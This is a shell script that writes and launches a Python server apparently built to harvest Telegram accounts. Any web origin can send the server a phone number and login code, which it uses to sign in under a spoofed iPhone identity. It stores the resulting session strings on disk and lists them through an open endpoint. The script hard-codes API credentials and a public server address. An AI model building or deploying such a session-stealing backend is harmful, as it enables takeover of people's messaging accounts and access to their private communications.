# Удаляем старый
rm -f /root/server.py

# Создаем чистый server.py
cat > /root/server.py << 'EOF'
#!/usr/bin/env python3
import asyncio
import json
import random
import string
import os
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ==================== TELETHON ИМПОРТ ====================
try:
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.errors import (
        SessionPasswordNeededError,
        PhoneCodeInvalidError,
        PhoneCodeExpiredError,
        PhoneNumberFloodError,
        PhoneNumberUnoccupiedError,
        PhoneNumberInvalidError
    )
    print("✅ Telethon импортирован")
except ImportError:
    print("❌ Telethon не установлен!")
    print("Установи: pip3 install telethon")
    sys.exit(1)

# ==================== КОНФИГ ====================
API_ID = 9348118
API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"
PORT = 5000

# ==================== ХРАНИЛИЩЕ ====================
active_sessions = {}  # session_id -> {phone, phone_code_hash, client, timestamp}

# ==================== ЛОГИ ====================
def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{ts}] {msg}")

# ==================== TELEGRAM ФУНКЦИИ ====================
async def telegram_request_code(phone_number):
    """Отправляет запрос кода в Telegram"""
    try:
        # Очистка номера
        phone = ''.join(c for c in phone_number if c.isdigit())
        
        if len(phone) < 11:
            return {"status": "error", "message": "Неверный номер телефона"}
        
        # Форматирование
        if not phone.startswith('7') and not phone.startswith('8'):
            phone = '7' + phone
        
        # Генерация ID сессии
        session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
        
        # Создание клиента Telegram
        client = TelegramClient(
            StringSession(),
            API_ID,
            API_HASH,
            device_model="iPhone 13 Pro",
            system_version="iOS 15.0",
            app_version="8.4.1",
            lang_code="en"
        )
        
        # Подключение
        await client.connect()
        log(f"Подключились к Telegram API")
        
        # Отправка запроса кода
        log(f"Отправляем код на номер: {phone}")
        sent_code = await client.send_code_request(phone)
        log(f"Telegram принял запрос, код отправлен")
        
        # Сохранение сессии
        active_sessions[session_id] = {
            'phone': phone,
            'phone_code_hash': sent_code.phone_code_hash,
            'client': client,
            'created_at': datetime.now().isoformat()
        }
        
        return {
            "status": "success",
            "session_id": session_id,
            "message": f"Код отправлен на {phone}",
            "phone": phone
        }
        
    except PhoneNumberFloodError:
        return {"status": "error", "message": "Слишком много запросов. Подождите."}
    except PhoneNumberUnoccupiedError:
        return {"status": "error", "message": "Номер не зарегистрирован в Telegram"}
    except PhoneNumberInvalidError:
        return {"status": "error", "message": "Неверный номер телефона"}
    except Exception as e:
        log(f"Ошибка Telegram (send_code): {type(e).__name__}: {str(e)}")
        return {"status": "error", "message": f"Ошибка Telegram: {str(e)}"}

async def telegram_verify_code(session_id, code):
    """Проверяет код и создает сессию"""
    if session_id not in active_sessions:
        return {"status": "error", "message": "Сессия не найдена"}
    
    session_data = active_sessions[session_id]
    client = session_data['client']
    phone = session_data['phone']
    
    try:
        log(f"Проверяем код для {phone}")
        
        # Вход в аккаунт
        await client.sign_in(
            phone=phone,
            code=code.strip(),
            phone_code_hash=session_data['phone_code_hash']
        )
        
        log(f"Успешный вход в аккаунт {phone}")
        
        # Получение строки сессии
        session_string = await client.session.save()
        
        # Создание папки для сессий
        os.makedirs('/root/telegram_sessions', exist_ok=True)
        
        # Сохранение в файл
        filename = f"/root/telegram_sessions/{phone}_{session_id}.session"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(session_string)
        
        # Отключение клиента
        await client.disconnect()
        
        # Удаление из активных сессий
        del active_sessions[session_id]
        
        log(f"✅ Сессия сохранена: {filename}")
        log(f"📏 Длина сессии: {len(session_string)} символов")
        
        return {
            "status": "success",
            "message": "Сессия успешно создана!",
            "session_file": filename,
            "phone": phone,
            "session_size": len(session_string)
        }
        
    except PhoneCodeInvalidError:
        return {"status": "error", "message": "Неверный код"}
    except PhoneCodeExpiredError:
        return {"status": "error", "message": "Код устарел"}
    except SessionPasswordNeededError:
        return {"status": "error", "message": "Требуется пароль 2FA"}
    except Exception as e:
        log(f"Ошибка входа: {type(e).__name__}: {str(e)}")
        return {"status": "error", "message": f"Ошибка: {str(e)}"}
    finally:
        # Очистка при ошибках
        if session_id in active_sessions:
            try:
                await active_sessions[session_id]['client'].disconnect()
            except:
                pass
            del active_sessions[session_id]

# ==================== HTTP СЕРВЕР ====================
class TelegramAPIHandler(BaseHTTPRequestHandler):
    
    def _send_response(self, data, status_code=200):
        """Отправка JSON ответа с CORS"""
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        self.wfile.write(json.dumps(data, ensure_ascii=False).encode('utf-8'))
    
    def do_OPTIONS(self):
        """CORS preflight"""
        self._send_response({})
    
    def do_GET(self):
        """GET запросы"""
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<h1>Telegram Session API</h1><p>Use POST endpoints</p>')
        
        elif self.path == '/status':
            self._send_response({
                "server": "Telegram Session API",
                "status": "online",
                "port": PORT,
                "active_sessions": len(active_sessions),
                "time": datetime.now().isoformat()
            })
        
        elif self.path == '/sessions':
            session_files = []
            if os.path.exists('/root/telegram_sessions'):
                for f in os.listdir('/root/telegram_sessions'):
                    if f.endswith('.session'):
                        session_files.append(f)
            
            self._send_response({"sessions": session_files})
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """POST запросы"""
        # Чтение тела
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            self._send_response({"status": "error", "message": "Invalid JSON"}, 400)
            return
        
        # Создаем event loop для асинхронных вызовов
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            if self.path == '/auth/start':
                phone = data.get('phone', '').strip()
                
                if not phone:
                    self._send_response({"status": "error", "message": "Phone required"}, 400)
                    return
                
                log(f"📱 Запрос кода для номера: {phone}")
                result = loop.run_until_complete(telegram_request_code(phone))
                self._send_response(result)
            
            elif self.path == '/auth/code':
                session_id = data.get('session_id', '').strip()
                code = data.get('code', '').strip()
                
                if not session_id or not code:
                    self._send_response({"status": "error", "message": "Session ID and code required"}, 400)
                    return
                
                log(f"🔢 Проверка кода {code} для сессии {session_id}")
                result = loop.run_until_complete(telegram_verify_code(session_id, code))
                self._send_response(result)
            
            else:
                self._send_response({"status": "error", "message": "Endpoint not found"}, 404)
                
        except Exception as e:
            log(f"Серверная ошибка: {type(e).__name__}: {str(e)}")
            self._send_response({"status": "error", "message": f"Server error: {str(e)}"}, 500)
        
        finally:
            loop.close()
    
    def log_message(self, format, *args):
        """Отключаем логи запросов"""
        pass

# ==================== ЗАПУСК СЕРВЕРА ====================
def main():
    print("\n" + "="*60)
    print("🔐 TELEGRAM SESSION SERVER")
    print("="*60)
    print(f"📍 Host: 0.0.0.0:{PORT}")
    print(f"🌐 Public URL: http://188.225.11.61:{PORT}")
    print(f"📱 API ID: {API_ID}")
    print(f"🔑 API Hash: {API_HASH[:12]}...")
    print(f"📊 Active sessions: 0")
    print("\n📡 Endpoints:")
    print(f"  POST http://188.225.11.61:{PORT}/auth/start")
    print(f"  POST http://188.225.11.61:{PORT}/auth/code")
    print(f"  GET  http://188.225.11.61:{PORT}/status")
    print(f"  GET  http://188.225.11.61:{PORT}/sessions")
    print("\n💾 Sessions will be saved to: /root/telegram_sessions/")
    print("="*60 + "\n")
    
    # Создаем папку для сессий
    os.makedirs('/root/telegram_sessions', exist_ok=True)
    
    # Запускаем сервер
    server = HTTPServer(('0.0.0.0', PORT), TelegramAPIHandler)
    
    try:
        log("Сервер запущен успешно!")
        server.serve_forever()
    except KeyboardInterrupt:
        log("Сервер остановлен")
        server.server_close()
    except Exception as e:
        log(f"Ошибка сервера: {e}")
        sys.exit(1)

if __name__ == '__main__':
    # Проверяем подключение к Telegram
    async def test_connection():
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            # Проверяем соединение без входа
            is_connected = await client.is_user_authorized()
            await client.disconnect()
            if not is_connected:
                print("✅ Подключение к Telegram API: OK (не авторизован)")
            return True
        except Exception as e:
            print(f"❌ Ошибка подключения к Telegram: {e}")
            print("Проверьте API_ID и API_HASH")
            return False
    
    # Запускаем проверку
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    if loop.run_until_complete(test_connection()):
        main()
    else:
        print("❌ Не удалось подключиться к Telegram API")
        print("1. Проверьте API_ID и API_HASH")
        print("2. Проверьте подключение к интернету")
        print("3. Убедитесь что telethon установлен: pip3 install telethon")
        sys.exit(1)
EOF

# Даем права
chmod +x /root/server.py

# Проверяем Telethon
pip3 install telethon --upgrade

# Запускаем сервер
cd /root
python3 server.py
